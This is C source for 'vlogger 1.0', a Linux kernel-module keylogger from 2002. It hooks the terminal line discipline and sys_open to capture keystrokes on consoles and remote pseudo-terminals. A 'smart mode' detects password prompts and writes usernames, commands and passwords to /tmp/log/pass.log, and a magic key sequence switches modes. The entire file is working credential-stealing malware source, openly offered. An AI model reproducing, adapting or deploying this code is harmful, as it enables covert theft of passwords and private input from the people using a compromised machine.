<++> vlogger/vlogger.c
/*
 *  vlogger 1.0
 *
 *  Copyright (C) 2002 rd <rd@vnsecurity.net>
 *
 *  Please check http://www.thehackerschoice.com/ for update
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 *  Greets to THC & vnsecurity
 *
 */

#define __KERNEL_SYSCALLS__
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/smp_lock.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <asm/errno.h>
#include <asm/io.h>

#ifndef KERNEL_VERSION
#define KERNEL_VERSION(a,b,c) (((a) << 16) + ((b) << 8) + (c))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,4,9)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("rd@vnsecurity.net");
#endif

#define MODULE_NAME "vlogger "
#define MVERSION "vlogger 1.0 - by rd@vnsecurity.net\n"

#ifdef DEBUG
#define DPRINT(format, args...) printk(MODULE_NAME format, ##args)
#else
#define DPRINT(format, args...)
#endif

#define N_TTY_NAME "tty"
#define N_PTS_NAME "pts"
#define MAX_TTY_CON 8
#define MAX_PTS_CON 256
#define LOG_DIR "/tmp/log"
#define PASS_LOG LOG_DIR "/pass.log"

#define TIMEZONE 7*60*60	// GMT+7

#define ESC_CHAR 27
#define BACK_SPACE_CHAR1 127	// local
#define BACK_SPACE_CHAR2 8	// remote

#define VK_TOGLE_CHAR 29	// CTRL-]
#define MAGIC_PASS "31337" 	// to switch mode, press MAGIC_PASS and 
				// VK_TOGLE_CHAR

#define	VK_NORMAL 0
#define	VK_DUMBMODE 1
#define	VK_SMARTMODE 2
#define DEFAULT_MODE VK_DUMBMODE

#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SZ 12

#define TTY_NUMBER(tty) MINOR((tty)->device) - (tty)->driver.minor_start \
			+ (tty)->driver.name_base
#define TTY_INDEX(tty) tty->driver.type == \
			TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
			TTY_NUMBER(tty):TTY_NUMBER(tty)
#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
#define TTY_WRITE(tty, buf, count) (*tty->driver.write)(tty, 0, \
							buf, count)

#define TTY_NAME(tty) (tty->driver.type == \
		TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: \
		tty->driver.type == TTY_DRIVER_TYPE_PTY && \
		tty->driver.subtype == PTY_TYPE_SLAVE?N_PTS_NAME:"")

#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

int errno;

struct tlogger {
	struct tty_struct *tty;
	char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
	int lastpos;
	int status;
	int pass;
};

struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = { NULL };
void (*old_receive_buf)(struct tty_struct *, const unsigned char *,
			char *, int);
asmlinkage int (*original_sys_open)(const char *, int, int);

int vlogger_mode = DEFAULT_MODE;

/* Prototypes */
static inline void init_tty(struct tty_struct *, int);

/*
static char *_tty_make_name(struct tty_struct *tty, 
				const char *name, char *buf)
{
	int idx = (tty)?MINOR(tty->device) - tty->driver.minor_start:0;

	if (!tty) 
		strcpy(buf, "NULL tty");
	else
		sprintf(buf, name,
			idx + tty->driver.name_base);
	return buf;
}

char *tty_name(struct tty_struct *tty, char *buf)
{
	return _tty_make_name(tty, (tty)?tty->driver.name:NULL, buf);
}
*/

#define SECS_PER_HOUR   (60 * 60)
#define SECS_PER_DAY    (SECS_PER_HOUR * 24)
#define isleap(year) \
	((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))

struct vtm {
	int tm_sec;
	int tm_min;
	int tm_hour;
	int tm_mday;
	int tm_mon;
	int tm_year;
};


/* 
 *  Convert from epoch to date 
 */
 
int epoch2time (const time_t *t, long int offset, struct vtm *tp)
{
	static const unsigned short int mon_yday[2][13] = {
	   /* Normal years.  */
	   { 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
	   /* Leap years.  */
	   { 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
	};

	long int days, rem, y;
	const unsigned short int *ip;

	days = *t / SECS_PER_DAY;
	rem = *t % SECS_PER_DAY;
	rem += offset;
	while (rem < 0) { 
		rem += SECS_PER_DAY;
		--days;
	}
	while (rem >= SECS_PER_DAY) {
		rem -= SECS_PER_DAY;
		++days;
	}
	tp->tm_hour = rem / SECS_PER_HOUR;
	rem %= SECS_PER_HOUR;
	tp->tm_min = rem / 60;
	tp->tm_sec = rem % 60;
	y = 1970;

	while (days < 0 || days >= (isleap (y) ? 366 : 365)) {
		long int yg = y + days / 365 - (days % 365 < 0);
		days -= ((yg - y) * 365
			+ LEAPS_THRU_END_OF (yg - 1)
			- LEAPS_THRU_END_OF (y - 1));
		y = yg;
	}
	tp->tm_year = y - 1900;
	if (tp->tm_year != y - 1900)
		return 0;
	ip = mon_yday[isleap(y)];
	for (y = 11; days < (long int) ip[y]; --y)
		continue;
	days -= ip[y];
	tp->tm_mon = y;
	tp->tm_mday = days + 1;
	return 1;
}


/* 
 *  Get current date & time
 */

void get_time (char *date_time) 
{
	struct timeval tv;
	time_t t;
	struct vtm tm;
	
	do_gettimeofday(&tv);
        t = (time_t)tv.tv_sec;
	
	epoch2time(&t, TIMEZONE, &tm);

	sprintf(date_time, "%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
		tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
		tm.tm_sec);
}


/* 
 * Get task structure from pgrp id
 */

inline struct task_struct *get_task(pid_t pgrp) 
{
	struct task_struct *task = current;

        do {
                if (task->pgrp == pgrp) {
                        return task;
                }
                task = task->next_task;
        } while (task != current);
        return NULL;
}


#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define WRITABLE(f) (f->f_op && f->f_op->write)

int write_to_file(char *logfile, char *buf, int size)
{
	int ret = 0;
	struct file   *f = NULL;

	lock_kernel();
	BEGIN_KMEM;
	f = filp_open(logfile, O_CREAT|O_APPEND, 00600);

	if (IS_ERR(f)) {
		DPRINT("Error %ld opening %s\n", -PTR_ERR(f), logfile);
		ret = -1;
	} else {
		if (WRITABLE(f))
			_write(f, buf, size);
		else {
	      		DPRINT("%s does not have a write method\n",
	      			logfile);
			ret = -1;
		}
    			
		if ((ret = filp_close(f,NULL)))
			DPRINT("Error %d closing %s\n", -ret, logfile);
	}
	END_KMEM;
	unlock_kernel();

	return ret;
}


#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; }


/* 
 *  Logging keystrokes
 */

void logging(struct tty_struct *tty, struct tlogger *tmp, int cont) 
{
	int i;

	char logfile[256];
	char loginfo[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ + 256];
	char date_time[24];
	struct task_struct *task;

	if (vlogger_mode == VK_NORMAL)
		return;

	if ((vlogger_mode == VK_SMARTMODE) && (!tmp->lastpos || cont))
		return;
		
	task = get_task(tty->pgrp);
		
	for (i=0; i<tmp->lastpos; i++)
		if (tmp->buf[i] == 0x0D) tmp->buf[i] = 0x0A;

	if (!cont) 
		tmp->buf[tmp->lastpos++] = 0x0A;
	
	tmp->buf[tmp->lastpos] = 0;

	if (vlogger_mode == VK_DUMBMODE) {
		snprintf(logfile, sizeof(logfile)-1, "%s/%s%d",
				LOG_DIR, TTY_NAME(tty),	TTY_NUMBER(tty));
		BEGIN_ROOT
		if (!tmp->status) {
			get_time(date_time);
			if (task)
				snprintf(loginfo, sizeof(loginfo)-1,
					"<%s uid=%d %s> %s", date_time,
					task->uid, task->comm, tmp->buf);
			else
				snprintf(loginfo, sizeof(loginfo)-1,
					"<%s> %s", date_time, tmp->buf);
			
			write_to_file(logfile, loginfo, strlen(loginfo));
		} else {
			write_to_file(logfile, tmp->buf, tmp->lastpos);
		}
		END_ROOT

#ifdef DEBUG
		if (task)
			DPRINT("%s/%d uid=%d %s: %s", 
				TTY_NAME(tty), TTY_NUMBER(tty), 
				task->uid, task->comm, tmp->buf);
		else
			DPRINT("%s", tmp->buf);
#endif
		tmp->status = cont;
		
	} else {

		/*
		 *  Logging USER/CMD and PASS in SMART_MODE
		 */

		BEGIN_ROOT
		if (!tmp->pass) {
			get_time(date_time);
			if (task)
				snprintf(loginfo, sizeof(loginfo)-1,
					"\n[%s tty=%s/%d uid=%d %s]\n"
					"USER/CMD %s", date_time, 
					TTY_NAME(tty),TTY_NUMBER(tty), 
					task->uid, task->comm, tmp->buf);
			else
				snprintf(loginfo, sizeof(loginfo)-1,
					"\n[%s tty=%s/%d]\nUSER/CMD %s",
					date_time, TTY_NAME(tty), 
					TTY_NUMBER(tty), tmp->buf);

			write_to_file(PASS_LOG, loginfo, strlen(loginfo));
		} else {
			snprintf(loginfo, sizeof(loginfo)-1, "PASS %s",
					tmp->buf);
			write_to_file (PASS_LOG, loginfo, strlen(loginfo));
		}

		END_ROOT

#ifdef DEBUG
		if (!tmp->pass)
			DPRINT("USER/CMD %s", tmp->buf);
		else
			DPRINT("PASS %s", tmp->buf);
#endif
	}

	if (!cont) tmp->buf[--tmp->lastpos] = 0;
}


#define resetbuf(t)		\
{				\
	t->buf[0] = 0;		\
	t->lastpos = 0;		\
}

#define append_c(t, s, n)	\
{				\
	t->lastpos += n;	\
	strncat(t->buf, s, n);	\
}

static inline void reset_all_buf(void)
{
	int i = 0;
	for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++)
		if (ttys[i] != NULL)
			resetbuf(ttys[i]);
}

void special_key(struct tlogger *tmp, const unsigned char *cp, int count)
{
    	switch(count) {
	    case 2:
    	    	switch(cp[1]) {
			case '\'':
				append_c(tmp, "[ALT-\']", 7);
				break;
			case ',':
				append_c(tmp, "[ALT-,]", 7);
				break;
			case '-':
				append_c(tmp, "[ALT--]", 7);
				break;
			case '.':
				append_c(tmp, "[ALT-.]", 7);
				break;
			case '/':
				append_c(tmp, "[ALT-/]", 7);
				break;
			case '0':
				append_c(tmp, "[ALT-0]", 7);
				break;
			case '1':
				append_c(tmp, "[ALT-1]", 7);
				break;
			case '2':
				append_c(tmp, "[ALT-2]", 7);
				break;
			case '3':
				append_c(tmp, "[ALT-3]", 7);
				break;
			case '4':
				append_c(tmp, "[ALT-4]", 7);
				break;
			case '5':
				append_c(tmp, "[ALT-5]", 7);
				break;
			case '6':
				append_c(tmp, "[ALT-6]", 7);
				break;
			case '7':
				append_c(tmp, "[ALT-7]", 7);
				break;
			case '8':
				append_c(tmp, "[ALT-8]", 7);
				break;
			case '9':
				append_c(tmp, "[ALT-9]", 7);
				break;
			case ';':
				append_c(tmp, "[ALT-;]", 7);
				break;
			case '=':
				append_c(tmp, "[ALT-=]", 7);
				break;
			case '[':
				append_c(tmp, "[ALT-[]", 7);
				break;
			case '\\':
				append_c(tmp, "[ALT-\\]", 7);
				break;
			case ']':
				append_c(tmp, "[ALT-]]", 7);
				break;
			case '`':
				append_c(tmp, "[ALT-`]", 7);
				break;
			case 'a':
				append_c(tmp, "[ALT-A]", 7);
				break;
			case 'b':
				append_c(tmp, "[ALT-B]", 7);
				break;
			case 'c':
				append_c(tmp, "[ALT-C]", 7);
				break;
			case 'd':
				append_c(tmp, "[ALT-D]", 7);
				break;
			case 'e':
				append_c(tmp, "[ALT-E]", 7);
				break;
			case 'f':
				append_c(tmp, "[ALT-F]", 7);
				break;
			case 'g':
				append_c(tmp, "[ALT-G]", 7);
				break;
			case 'h':
				append_c(tmp, "[ALT-H]", 7);
				break;
			case 'i':
				append_c(tmp, "[ALT-I]", 7);
				break;
			case 'j':
				append_c(tmp, "[ALT-J]", 7);
				break;
			case 'k':
				append_c(tmp, "[ALT-K]", 7);
				break;
			case 'l':
				append_c(tmp, "[ALT-L]", 7);
				break;
			case 'm':
				append_c(tmp, "[ALT-M]", 7);
				break;
			case 'n':
				append_c(tmp, "[ALT-N]", 7);
				break;
			case 'o':
				append_c(tmp, "[ALT-O]", 7);
				break;
			case 'p':
				append_c(tmp, "[ALT-P]", 7);
				break;
			case 'q':
				append_c(tmp, "[ALT-Q]", 7);
				break;
			case 'r':
				append_c(tmp, "[ALT-R]", 7);
				break;
			case 's':
				append_c(tmp, "[ALT-S]", 7);
				break;
			case 't':
				append_c(tmp, "[ALT-T]", 7);
				break;
			case 'u':
				append_c(tmp, "[ALT-U]", 7);
				break;
			case 'v':
				append_c(tmp, "[ALT-V]", 7);
				break;
			case 'x':
				append_c(tmp, "[ALT-X]", 7);
				break;
			case 'y':
				append_c(tmp, "[ALT-Y]", 7);
				break;
			case 'z':
				append_c(tmp, "[ALT-Z]", 7);
				break;
		}
		break;
	    case 3:
		switch(cp[2]) {
			case 68:
				// Left: 27 91 68
				append_c(tmp, "[LEFT]", 6);
				break;
			case 67:
				// Right: 27 91 67
				append_c(tmp, "[RIGHT]", 7);
				break;
			case 65:
				// Up: 27 91 65
				append_c(tmp, "[UP]", 4);
				break;
			case 66:
				// Down: 27 91 66
				append_c(tmp, "[DOWN]", 6);
				break;
			case 80:
				// Pause/Break: 27 91 80 
				append_c(tmp, "[BREAK]", 7);
				break;
		}
		break;
	    case 4:
		switch(cp[3]) {
			case 65:
				// F1: 27 91 91 65
				append_c(tmp, "[F1]", 4);
				break;
			case 66:
				// F2: 27 91 91 66
				append_c(tmp, "[F2]", 4);
				break;
			case 67:
				// F3: 27 91 91 67
				append_c(tmp, "[F3]", 4);
				break;
			case 68:
				// F4: 27 91 91 68
				append_c(tmp, "[F4]", 4);
				break;
			case 69:
				// F5: 27 91 91 69
				append_c(tmp, "[F5]", 4);
				break;
			case 126:
				switch(cp[2]) {
					case 53:
						// PgUp: 27 91 53 126
						append_c(tmp, "[PgUP]", 6);
						break;
					case 54:
						// PgDown: 27 91 54 126
						append_c(tmp, 
							"[PgDOWN]", 8);
						break;
					case 49:
						// Home: 27 91 49 126
						append_c(tmp, "[HOME]", 6);
						break;
					case 52:
						// End: 27 91 52 126
						append_c(tmp, "[END]", 5);
						break;
					case 50:
						// Insert: 27 91 50 126
						append_c(tmp, "[INS]", 5);
						break;
					case 51:
						// Delete: 27 91 51 126
						append_c(tmp, "[DEL]", 5);
						break;
				}
			break;
		}
		break;
	    case 5:
		if(cp[2] == 50)
			switch(cp[3]) {
				case 48:
					// F9: 27 91 50 48 126
					append_c(tmp, "[F9]", 4);
					break;
				case 49:
					// F10: 27 91 50 49 126
					append_c(tmp, "[F10]", 5);
					break;
				case 51:
					// F11: 27 91 50 51 126
					append_c(tmp, "[F11]", 5);
					break;
				case 52:
					// F12: 27 91 50 52 126
					append_c(tmp, "[F12]", 5);
					break;
				case 53:
					// Shift-F1: 27 91 50 53 126
					append_c(tmp, "[SH-F1]", 7);
					break;
				case 54:
					// Shift-F2: 27 91 50 54 126
					append_c(tmp, "[SH-F2]", 7);
					break;
				case 56:
					// Shift-F3: 27 91 50 56 126
					append_c(tmp, "[SH-F3]", 7);
					break;
				case 57:
					// Shift-F4: 27 91 50 57 126
					append_c(tmp, "[SH-F4]", 7);
					break;
			}
		else
			switch(cp[3]) {
				case 55:
					// F6: 27 91 49 55 126
					append_c(tmp, "[F6]", 4);
					break;
		     		case 56:
					// F7: 27 91 49 56 126
					append_c(tmp, "[F7]", 4);
					break;
     				case 57:
					// F8: 27 91 49 57 126
					append_c(tmp, "[F8]", 4);
					break;
		     		case 49:
					// Shift-F5: 27 91 51 49 126
					append_c(tmp, "[SH-F5]", 7);
					break;
		     		case 50:
					// Shift-F6: 27 91 51 50 126
					append_c(tmp, "[SH-F6]", 7);
					break;
     				case 51:
					// Shift-F7: 27 91 51 51 126
					append_c(tmp, "[SH-F7]", 7);
					break;
		     		case 52:
					// Shift-F8: 27 91 51 52 126
					append_c(tmp, "[SH-F8]", 7);
					break;
			};
		break;
	    default:	// Unknow
		break;
    }
}


/* 
 *  Called whenever user press a key
 */

void vlogger_process(struct tty_struct *tty, 
			const unsigned char *cp, int count)
{
	struct tlogger *tmp = ttys[TTY_INDEX(tty)];

	if (!tmp) {
		DPRINT("erm .. unknow error???\n");
		init_tty(tty, TTY_INDEX(tty));
		tmp = ttys[TTY_INDEX(tty)];
		if (!tmp)
			return;
	}

	if (vlogger_mode == VK_SMARTMODE) {
		if (tmp->status && !IS_PASSWD(tty)) {
			resetbuf(tmp);
		}		
		if (!tmp->pass && IS_PASSWD(tty)) {
			logging(tty, tmp, 0);
			resetbuf(tmp);
		}
		if (tmp->pass && !IS_PASSWD(tty)) { 
			if (!tmp->lastpos)
				logging(tty, tmp, 0);
			resetbuf(tmp);
		}
		tmp->pass  = IS_PASSWD(tty);
		tmp->status = 0;
	}

	if ((count + tmp->lastpos) > MAX_BUFFER - 1) {	
		logging(tty, tmp, 1);
		resetbuf(tmp);
	} 

	if (count == 1) {
		if (cp[0] == VK_TOGLE_CHAR) {
			if (!strcmp(tmp->buf, MAGIC_PASS)) {
				if(vlogger_mode < 2)
					vlogger_mode++;
				else
					vlogger_mode = 0;
				reset_all_buf();

				switch(vlogger_mode) {
					case VK_DUMBMODE:
				    		DPRINT("Dumb Mode\n");
						TTY_WRITE(tty, "\r\n"
				    		"Dumb Mode\n", 12);
						break;
					case VK_SMARTMODE:
				    		DPRINT("Smart Mode\n");
						TTY_WRITE(tty, "\r\n"
						"Smart Mode\n", 13);
						break;
					case VK_NORMAL:
					    	DPRINT("Normal Mode\n");
						TTY_WRITE(tty, "\r\n"
						"Normal Mode\n", 14);
				}
			}
		}

		switch (cp[0]) {
			case 0x01:	//^A
				append_c(tmp, "[^A]", 4);
				break;
			case 0x02:	//^B
				append_c(tmp, "[^B]", 4);
				break;
			case 0x03:	//^C
				append_c(tmp, "[^C]", 4);
			case 0x04:	//^D
				append_c(tmp, "[^D]", 4);
			case 0x0D:	//^M
			case 0x0A:
				if (vlogger_mode == VK_SMARTMODE) {
					if (IS_PASSWD(tty)) {
						logging(tty, tmp, 0);
						resetbuf(tmp);
					} else
						tmp->status = 1;
				} else {
					logging(tty, tmp, 0);
					resetbuf(tmp);
				}
				break;
			case 0x05:	//^E
				append_c(tmp, "[^E]", 4);
				break;
			case 0x06:	//^F
				append_c(tmp, "[^F]", 4);
				break;
			case 0x07:	//^G
				append_c(tmp, "[^G]", 4);
				break;
			case 0x09:	//TAB - ^I
				append_c(tmp, "[TAB]", 5);
				break;
			case 0x0b:	//^K
				append_c(tmp, "[^K]", 4);
				break;
			case 0x0c:	//^L
				append_c(tmp, "[^L]", 4);
				break;
			case 0x0e:	//^E
				append_c(tmp, "[^E]", 4);
				break;
			case 0x0f:	//^O
				append_c(tmp, "[^O]", 4);
				break;
			case 0x10:	//^P
				append_c(tmp, "[^P]", 4);
				break;
			case 0x11:	//^Q
				append_c(tmp, "[^Q]", 4);
				break;
			case 0x12:	//^R
				append_c(tmp, "[^R]", 4);
				break;
			case 0x13:	//^S
				append_c(tmp, "[^S]", 4);
				break;
			case 0x14:	//^T
				append_c(tmp, "[^T]", 4);
				break;
			case 0x15:	//CTRL-U
				resetbuf(tmp);
				break;				
			case 0x16:	//^V
				append_c(tmp, "[^V]", 4);
				break;
			case 0x17:	//^W
				append_c(tmp, "[^W]", 4);
				break;
			case 0x18:	//^X
				append_c(tmp, "[^X]", 4);
				break;
			case 0x19:	//^Y
				append_c(tmp, "[^Y]", 4);
				break;
			case 0x1a:	//^Z
				append_c(tmp, "[^Z]", 4);
				break;
			case 0x1c:	//^\
				append_c(tmp, "[^\\]", 4);
				break;
			case 0x1d:	//^]
				append_c(tmp, "[^]]", 4);
				break;
			case 0x1e:	//^^
				append_c(tmp, "[^^]", 4);
				break;
			case 0x1f:	//^_
				append_c(tmp, "[^_]", 4);
				break;
			case BACK_SPACE_CHAR1:
			case BACK_SPACE_CHAR2:
				if (!tmp->lastpos) break;
				if (tmp->buf[tmp->lastpos-1] != ']')
					tmp->buf[--tmp->lastpos] = 0;
				else {
					append_c(tmp, "[^H]", 4);
				}
				break;
			case ESC_CHAR:	//ESC
				append_c(tmp, "[ESC]", 5);
				break;
			default:
				tmp->buf[tmp->lastpos++] = cp[0];
				tmp->buf[tmp->lastpos] = 0;
		}
	} else {	// a block of chars or special key
		if (cp[0] != ESC_CHAR) {
			while (count >= MAX_BUFFER) {
				append_c(tmp, cp, MAX_BUFFER);
				logging(tty, tmp, 1);
				resetbuf(tmp);
				count -= MAX_BUFFER;
				cp += MAX_BUFFER;
			}

			append_c(tmp, cp, count);
		} else 	// special key
			special_key(tmp, cp, count);
	}
}


void my_tty_open(void) 
{
	int fd, i;
	char dev_name[80];

#ifdef LOCAL_ONLY
	int fl = 0;
	struct tty_struct * tty;
	struct file * file;
#endif

	for (i=1; i<MAX_TTY_CON; i++) {
		snprintf(dev_name, sizeof(dev_name)-1, "/dev/tty%d", i);

		BEGIN_KMEM
			fd = open(dev_name, O_RDONLY, 0);
			if (fd < 0) continue;

#ifdef LOCAL_ONLY
			file = fget(fd);
			tty = file->private_data;
			if (tty != NULL  && 
				tty->ldisc.receive_buf != NULL) {
				if (!fl) {
					old_receive_buf = 
						tty->ldisc.receive_buf;
					fl = 1;
				}
				init_tty(tty, TTY_INDEX(tty));
			}
			fput(file);
#endif

			close(fd);
		END_KMEM
	}

#ifndef LOCAL_ONLY
	for (i=0; i<MAX_PTS_CON; i++) {
		snprintf(dev_name, sizeof(dev_name)-1, "/dev/pts/%d", i);

		BEGIN_KMEM
			fd = open(dev_name, O_RDONLY, 0);
			if (fd >= 0) close(fd);
		END_KMEM
	}
#endif

}


void new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
						char *fp, int count)
{
	if (!tty->real_raw && !tty->raw)	// ignore raw mode
		vlogger_process(tty, cp, count);
	(*old_receive_buf)(tty, cp, fp, count);
}


static inline void init_tty(struct tty_struct *tty, int tty_index)
{
	struct tlogger *tmp;

	DPRINT("Init logging for %s%d\n", TTY_NAME(tty), TTY_NUMBER(tty));

	if (ttys[tty_index] == NULL) {
		tmp = kmalloc(sizeof(struct tlogger), GFP_KERNEL);
		if (!tmp) {
			DPRINT("kmalloc failed!\n");
			return;
		}
		memset(tmp, 0, sizeof(struct tlogger));
		tmp->tty = tty;
		tty->ldisc.receive_buf = new_receive_buf;
		ttys[tty_index] = tmp;
	} else {
		tmp = ttys[tty_index];
		logging(tty, tmp, 1);
		resetbuf(tmp);
		tty->ldisc.receive_buf = new_receive_buf;
	}
}


asmlinkage int new_sys_open(const char *filename, int flags, int mode)
{
	int ret;
	static int fl = 0;
	struct file * file;
	
	ret = (*original_sys_open)(filename, flags, mode);
	
	if (ret >= 0) {
		struct tty_struct * tty;

	    BEGIN_KMEM
	    	lock_kernel();
		file = fget(ret);
		tty = file->private_data;

		if (tty != NULL && 
			((tty->driver.type == TTY_DRIVER_TYPE_CONSOLE &&
			TTY_NUMBER(tty) < MAX_TTY_CON - 1 ) ||
			(tty->driver.type == TTY_DRIVER_TYPE_PTY &&
			tty->driver.subtype == PTY_TYPE_SLAVE &&
			TTY_NUMBER(tty) < MAX_PTS_CON)) &&
			tty->ldisc.receive_buf != NULL &&
			tty->ldisc.receive_buf != new_receive_buf) {

			if (!fl) {
				old_receive_buf = tty->ldisc.receive_buf;
				fl = 1;
			}
			init_tty(tty, TTY_INDEX(tty));
		}
		fput(file);
		unlock_kernel();
	    END_KMEM
	}
	return ret;
}
